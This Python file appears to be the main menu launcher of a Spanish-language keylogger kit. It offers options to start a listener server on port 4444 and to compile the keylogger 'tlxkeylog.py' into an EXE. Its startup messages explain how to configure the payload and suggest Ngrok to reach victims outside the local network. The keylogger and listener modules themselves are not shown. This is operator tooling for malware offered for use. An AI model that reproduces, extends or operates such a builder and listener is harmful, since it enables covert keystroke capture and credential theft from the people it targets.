import os
import time
from utils import banners
from utils import compiler
from utils import listener
from utils import printcolor

def credits():
        banners.tlanex_banner()
        printcolor.printl("[blink bold green]C R E D I T O S[/blink bold green]", justify="center", style="green")
        printcolor.printl("                                                                                    ", justify="center", style="green")
        printcolor.printl("   [ GIT HUB ]                                   » http://github.com/agk-tlanex «   ", justify="center", style="green")
        printcolor.printl("   [ TIK TOK ]                             » https://www.tiktok.com/@agk.tlanex «   ", justify="center", style="green")
        printcolor.printl("   [ INSTAGRAM ]                         » https://www.instagram.com/agk.tlanex «   ", justify="center", style="green")
        printcolor.println("   [ YOUTUBE ]       » https://www.youtube.com/channel/UCtp5Yi8hXZmvECXEPMiufRw «   ", justify="center", style="green")
        printcolor.printl("Presiona » [blink bold green]ENTER[/blink bold green] « para continuar...", justify="center", style="green")
        input()
        listener.clear()

def start():
    cursor = ""
    try:
        while cursor != 0:
            listener.clear()
            banners.main_banner()
            printcolor.printl("[ START SERVER ] [green]-------------[/green] ( 1 ) ", justify="center", style="bold green")
            printcolor.printl("[ COMPILAR EXE ] [green]-------------[/green] ( 2 ) ", justify="center", style="bold green")
            printcolor.printl("[   CREDITOS   ] [green]-------------[/green] ( 3 ) ", justify="center", style="bold green")
            printcolor.printl("[     [red]EXIT[/red]     ] [green]-------------[/green] ( 0 ) ", justify="center", style="bold green")

            try:
                cursor = int(input(">>> "))
                if cursor == 1:
                    time.sleep(2)
                    listener.clear()
                    banners.server_banner()
                    listener.ListenServer()
                    time.sleep(1)
                    printcolor.printl("[bold white][[/bold white][blink bold green]*[/blink bold green][bold white]][/bold white] Presione >>> [blink]ENTER[/blink] <<< para volver al menú.", justify="left", style="bold green")
                    input()
                    time.sleep(1)
                    listener.clear()
                if cursor == 2:
                    printcolor.printl("[bold white][[/bold white][blink bold green]*[/blink bold green][bold white]][/bold white] INICIANDO COMPILADOR", justify="left", style="bold green")
                    time.sleep(2)
                    compiler.compile()
                    time.sleep(1)
                    printcolor.printl("[bold white][[/bold white][blink bold green]*[/blink bold green][bold white]][/bold white] Presione >>> [blink]ENTER[/blink] <<< para volver al menú.", justify="left", style="bold green")
                    input()
                    time.sleep(1)
                    listener.clear()
                if cursor == 3:
                    time.sleep(1)
                    listener.clear()
                    credits()
                    listener.clear()

            except:
                printcolor.printl("[bold white][[/bold white][blink bold red]![/blink bold red][bold white]][/bold white] ERROR", justify="left", style="bold red")
                time.sleep(2)
    except KeyboardInterrupt:
        start()

def main():
    try:
        listener.clear()
        banners.tlanex_banner()
        time.sleep(2)
        printcolor.println("[bold white][[/bold white][blink bold green]*[/blink bold green][bold white]][/bold white] Iniciando, Espere...", justify="left", style="bold green")
        time.sleep(2)
        printcolor.println("[bold white][[/bold white][blink bold yellow]![/blink bold yellow][bold white]][/bold white] Antes de antes de compilar aseguese de configurar tlxkeylog.py.", justify="left", style="bold yellow")
        time.sleep(1)
        printcolor.println("[bold white][[/bold white][blink bold yellow]![/blink bold yellow][bold white]][/bold white] El puerto por defecto es 4444, pero puede cambiarlo en tlxkeylog.py y listener.py.", justify="left", style="bold yellow")
        time.sleep(1)
        printcolor.printl("[bold white][[/bold white][blink bold yellow]![/blink bold yellow][bold white]][/bold white] Puede acceder a los archivos con:.", justify="left", style="bold yellow")
        time.sleep(1)
        printcolor.printl("    1.- nano utils/tlxkeylog.py.", justify="left", style="bold yellow")
        time.sleep(1)
        printcolor.printl("    2.- nano utils/listener.py.", justify="left", style="bold yellow")
        time.sleep(1)
        printcolor.println("    3.- cd utils.", justify="left", style="bold yellow")
        time.sleep(1)
        printcolor.println("[bold white][[/bold white][blink bold yellow]![/blink bold yellow][bold white]][/bold white] Esta es una herramienta de red local, puedes usar Ngrok para hacerlo remoto.", justify="left", style="bold yellow")
        time.sleep(1)
        printcolor.printl("[bold white][[/bold white][blink bold yellow]*[/blink bold yellow][bold white]][/bold white] Presione >>> [blink]ENTER[/blink] <<< para iniciar.", justify="left", style="bold green")
        input()
        time.sleep(1)
        listener.clear()
        start()
    except KeyboardInterrupt:
        start()

main()